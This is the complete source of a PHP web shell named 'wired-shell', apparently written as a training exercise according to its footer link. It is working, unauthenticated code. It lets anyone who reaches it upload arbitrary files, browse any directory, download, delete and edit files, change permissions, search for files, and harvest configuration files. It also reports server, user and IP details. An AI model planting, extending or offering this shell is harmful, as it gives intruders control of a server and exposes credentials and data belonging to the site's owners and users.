<?php
$base_dir = getcwd();
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : $base_dir;
$real_current_dir = realpath($current_dir);

if ($real_current_dir === false) {
    $real_current_dir = $base_dir;
}

$files = scandir($real_current_dir);
$message = '';
$target_dir = $real_current_dir . '/';
$show_file_upload = !isset($_POST['directory']) && !isset($_POST['find_configs']);

if (isset($_GET['download'])) {
    $file_to_download = $_GET['download'];
    download_file($file_to_download);
    exit;
}
if (isset($_FILES['file'])) {
    $target_file = basename($_FILES['file']['name']);
    $target_path = $target_dir . $target_file;
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
        header(header: "Refresh:0");
    } else {
        $message = "<div>Error uploading file.</div>";
    }
} else if (isset($_POST['file']) && isset($_POST['permission'])) {
    $file = $_POST['file'];
    $new_permission = $_POST['permission'];

    $octal_permission = intval($new_permission, 8);

    if (chmod($file, $octal_permission)) {
        $message = "<div>Permissions changed successfully for " . htmlspecialchars($file) . " to " . htmlspecialchars($new_permission) . "</div>";
    } else {
        $message = "<div>Failed to change permissions for " . htmlspecialchars($file) . "</div>";
    }
} else if (isset($_POST['directory']) && isset($_POST['filename'])) {
    $directory = $_POST['directory'];
    $filename = $_POST['filename'];

    if (is_dir($directory)) {
        search_file($directory, $filename);
    }
} else if (isset($_POST['delete_file'])) {
    $file_to_delete = $_POST['delete_file'];
    if (unlink($file_to_delete)) {
        header("Refresh:0");
    } else {
        $message = "<div>Failed to delete file " . htmlspecialchars($file_to_delete) . ".</div>";
    }
} else if (isset($_POST['find_configs'])) {
    $directory = $_POST['directory'];
    search_config_files($directory);
} else if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $file_to_edit = $_POST['edit_file'];
    $new_content = $_POST['file_content'];
    $real_file_path = realpath($file_to_edit);

    if ($real_file_path && strpos($real_file_path, $real_current_dir) === 0 && is_writable($real_file_path)) {
        file_put_contents($real_file_path, $new_content);
        $message = "<div>File content updated successfully for " . htmlspecialchars(basename($file_to_edit)) . ".</div>";
    } else {
        $message = "<div>Failed to edit the file or access is denied.</div>";
    }
}
function search_file($dir, $file_to_search)
{
    global $message;
    $files = scandir($dir);
    foreach ($files as $key => $file) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $file);
        if (!is_dir($path)) {
            if ($file_to_search == $file) {
                $message = "File found<br>";
                $message .= $path . '<div><span>' . htmlspecialchars($file) . " - " . substr(sprintf('%o', fileperms($path)), -4) . '</span> 
            <a href="?download=' . urlencode($path) . '">Download</a> | 
            <form method="POST" style="display:inline;">
                    <input type="hidden" name="delete_file" value="' . htmlspecialchars($path) . '">
                    <button type="submit" class="button" onclick="return confirm(\'Are you sure to delete this file?\')">DELETE</button> </form> | 
                <form method="GET" style="display:inline;">
                        <input type="hidden" name="edit" value="' . htmlspecialchars($path) . '">
                        <button class="button" type="submit">Edit</button> </form> | 
                <form method="POST" style="display:inline;">
                    <label for="permission_' . htmlspecialchars($file) . '">Permission:</label>
                    <input type="text" name="permission" class="permission" id="permission_' . htmlspecialchars($file) . '" placeholder="' . substr(sprintf('%o', fileperms($path)), -4) . '" required>
                    <input type="hidden" name="file" value="' . htmlspecialchars($path) . '">
                    <button class="button" type="submit">Change</button></form><br/></div>';
                return;
            }
        } else if ($file != "." && $file != "..") {
            search_file($path, $file_to_search);
        }
    }
    $message .= "'" . $file_to_search . "' is not found in " . $dir . "<br>";
}

function search_config_files($dir)
{
    global $message;
    $config_patterns = ['*.conf', '*.cf', '*.plist', 'config.json', 'config', '.config', '*.cnf', '*.ini', '*.cfg', '*.json', '*.yaml', '*.yml', '*.xml'];
    $files_found = false;
    foreach ($config_patterns as $pattern) {
        foreach (glob("$dir/$pattern") as $file) {
            $path = realpath($file);
            $message = "Config found<br>";
            $message .= $path . '<div><span>' . basename(htmlspecialchars($file)) . " - " . substr(sprintf('%o', fileperms($path)), -4) . '</span> 
            <a href="?download=' . urlencode($path) . '">Download</a> | 
            <form method="POST" style="display:inline;">
                    <input type="hidden" name="delete_file" value="' . htmlspecialchars($path) . '">
                    <button type="submit" class="button" onclick="return confirm(\'Are you sure to delete this file?\')">DELETE</button> </form> | 
                <form method="GET" style="display:inline;">
                        <input type="hidden" name="edit" value="' . htmlspecialchars($path) . '">
                        <button class="button" type="submit">Edit</button> </form> | 
                <form method="POST" style="display:inline;">
                    <label for="permission_' . htmlspecialchars($file) . '">Permission:</label>
                    <input type="text" name="permission" class="permission" id="permission_' . htmlspecialchars($file) . '" placeholder="' . substr(sprintf('%o', fileperms($path)), -4) . '" required>
                    <input type="hidden" name="file" value="' . htmlspecialchars($path) . '">
                    <button class="button" type="submit">Change</button></form><br/></div>';
            $files_found = true;
        }
    }

    if (!$files_found) {
        $message = "<div>No configuration files found in " . htmlspecialchars($dir) . "</div>";
    }
}
function download_file($file_path)
{
    if (file_exists($file_path) && is_readable($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    } else {
        global $message;
        $message = "<div>File does not exist or is not readable.</div>";
    }
}
?>
<!DOCTYPE html>
<html>

<head>
    <title>wired-shell</title>
    <style type='text/css'>
        body {
            font-family: 'Inter', sans-serif;
            display: flex;
            min-height: 100vh;
            margin: 0;
            background: #0f0f0f;
            color: #fff;
            font-size: 12px;
        }

        .container {
            display: flex;
            flex-direction: column;
            border: 2px solid #D77189;
            padding: 1.5rem;
            border-radius: 0.5rem;
            position: relative;
            width: 100%;
        }

        .header {
            display: flex;
            justify-content: center;
        }

        a,
        a:hover {
            color: #D77189;
        }

        .info {
            flex: 1;
        }

        .button {
            border: none;
            background: none;
            color: #D77189;
            text-decoration: underline;
            cursor: pointer;
        }

        .permission {
            width: 2rem;
        }

        .ascii-art {
            flex-shrink: 0;
        }

        pre {
            white-space: pre-wrap;
            font-size: 0.3rem;
        }

        hr {
            margin: 1.5rem 0rem 1.5rem 0rem;
            border: 1px solid #D77189;
            display: flex;
            width: 100%;
        }

        .section {
            display: none;
        }

        .section.active {
            display: block;
        }

        #scan_dir.hidden {
            display: none;
        }
    </style>
    <script type="text/javascript">
        function showSection(sectionId) {
            document.querySelectorAll('.section').forEach(function(section) {
                section.classList.remove('active');
            });
            document.getElementById(sectionId).classList.add('active');
            const url = new URL(window.location);
            url.searchParams.delete('edit');
            window.history.replaceState({}, document.title, url);
            var scanDirElement = document.getElementById('scan_dir');
            if (sectionId === 'help') {
                scanDirElement.classList.add('hidden');
            } else {
                scanDirElement.classList.remove('hidden');
            }
        }
    </script>
</head>

<body>
    <div class='container'>
        <div class='header'>
            <div class="info">
                <?php echo php_uname() . "<br>" . $_SERVER['SERVER_SOFTWARE'] . "<br />Main Directory: " . getcwd() . "<br />User: " . get_current_user() . "<br />Your IP: " . $_SERVER['REMOTE_ADDR'] . "<br />Server IP : " . gethostbyname($_SERVER['HTTP_HOST']); ?>
            </div>
            <div class="ascii-art">
                <pre>
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░        ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                     ░▒▓█████████████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░
                </pre>
            </div>
        </div>
        <hr>
        <div class="center"><!-- MENU -->
            <div>
                <a class="button" onclick="showSection('file_upload')">[File Upload]</a><span> | </span>
                <a class="button" onclick="showSection('file_search')">[File Search]</a><span> | </span>
                <a class="button" onclick="showSection('config_search')">[Find Configs]</a><span> | </span>
                <a class="button" onclick="showSection('help')">[Help]</a>
            </div>
            <h3>
                <?php echo $message; ?>
            </h3>
        </div>
        <?php if ($show_file_upload): ?>
            <div id="file_upload" class="section active">
                <form method="POST" enctype="multipart/form-data">
                    <h2>File Upload</h2>
                    <input type="file" name="file" required>
                    <button type="submit">Upload</button>
                </form>
            </div>
        <?php endif; ?>

        <div id="file_search" class="section">
            <h2>File Search</h2>
            <form method="POST">
                <input type="hidden" name="directory" value="<?php echo $real_current_dir; ?>">
                <label for="filename">File Name:</label><br>
                <input type="text" name="filename" id="filename" placeholder="example.txt" required>
                <button type="submit">Search</button>
            </form>
        </div>
        <div id="config_search" class="section">
            <h2>Config Files Search</h2>
            <form method="POST">
                <input type="hidden" name="directory" value="<?php echo $real_current_dir; ?>">
                <button type="submit" name="find_configs">Search</button>
            </form>
        </div>
        <div id="file_edit" class="section <?php echo isset($_GET['edit']) ? 'active' : ''; ?>">
            <h2>Edit File</h2>
            <?php if (isset($_GET['edit'])): ?>
                <?php
                $file_to_edit = $_GET['edit'];
                $real_file_path = realpath($file_to_edit);
                if ($real_file_path && strpos($real_file_path, $real_current_dir) === 0 && is_readable($real_file_path)):
                    $file_content = file_get_contents($real_file_path);
                ?>
                    <form method="POST" action="">
                        <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($file_to_edit); ?>">
                        <textarea name="file_content" rows="20" cols="80" required><?php echo htmlspecialchars($file_content); ?></textarea><br>
                        <button type="submit" class="button">Save Changes</button>
                    </form>
                <?php else: ?>
                    <div>File cannot be accessed for editing.</div>
                <?php endif; ?>
            <?php else: ?>
                <div>Select a file to edit.</div>
            <?php endif; ?>
        </div>

        <div id="help" class="section" style="width:60%;">
            <h2>How to use wired-shell?</h2>
            <p>Use the navigation links to switch between functionalities like "File Upload," "File Search," and "Find Configs." Each section provides interactive forms to perform the respective tasks.</p>
            <p>In file upload you can upload any file you want.</p>
            <p>In file search you can search files in current directory. It does not searches through all directories.</p>
            <p>In find configs you can find config files with one click. Like file search, it only searches in current directory.</p>
            <p>In directory section you can find current directory, files and subdirectories. At the top, it shows the path of the active directory, helping users keep track of their location in the file system. If the current directory is not the root, a "Return Main" link is available to navigate back to the main directory. Below, all items in the current directory are listed, with directories displayed as clickable links that allow users to browse into them. For files, various management options are presented: users can see the file's name and permissions, and they can choose to download the file, delete it, or open it for editing.</p>
        </div>

        <div>
            <div class="header">
                <div class="info">
                    <div id="scan_dir">
                        <hr style="width:25%;">
                        <h3>Directory<br><?php echo htmlspecialchars($real_current_dir); ?></h3>
                        <?php
                        if ($real_current_dir !== '/') {
                            $parent_dir = dirname($real_current_dir);
                            echo '<a href="?dir=' . urlencode($base_dir) . '">Return Main</a><br>';
                        }

                        foreach ($files as $file) {
                            $file_path = $real_current_dir . '/' . $file;

                            if (is_dir($file_path)) {
                                echo '<a href="?dir=' . urlencode($file_path) . '">' . htmlspecialchars($file) . '</a> (Directory)<br>';
                            } else {
                                echo '<span>' . htmlspecialchars($file) . " - " . substr(sprintf('%o', fileperms($file_path)), -4) . '</span> <a href="?download=' . urlencode($file_path) . '">Download</a> | 
                        <form method="POST" style="display:inline;">
                        <input type="hidden" name="delete_file" value="' . htmlspecialchars($file_path) . '">
                        <button type="submit" class="button" onclick="return confirm(\'Are you sure to delete this file?\')">DELETE</button> </form> | 
                        <form method="GET" style="display:inline;">
                        <input type="hidden" name="edit" value="' . htmlspecialchars($file_path) . '">
                        <button class="button" type="submit">Edit</button> </form> | 
                        <form method="POST" style="display:inline;">
                        <label for="permission_' . htmlspecialchars($file) . '">Permission:</label>
                        <input type="text" name="permission" class="permission" id="permission_' . htmlspecialchars($file) . '" placeholder="' . substr(sprintf('%o', fileperms($file_path)), -4) . '" required>
                        <input type="hidden" name="file" value="' . htmlspecialchars($file_path) . '">
                        <button class="button" type="submit">Change</button>
                        </form><br/>';
                            }
                        }
                        ?>
                    </div>
                </div>
            </div>
            <hr>

            <div class='footer'>🄯 copyleft <a href="https://github.com/leidorf/yavuzlar/tree/main/t5-web-shell">wired-shell</a></div>
        </div>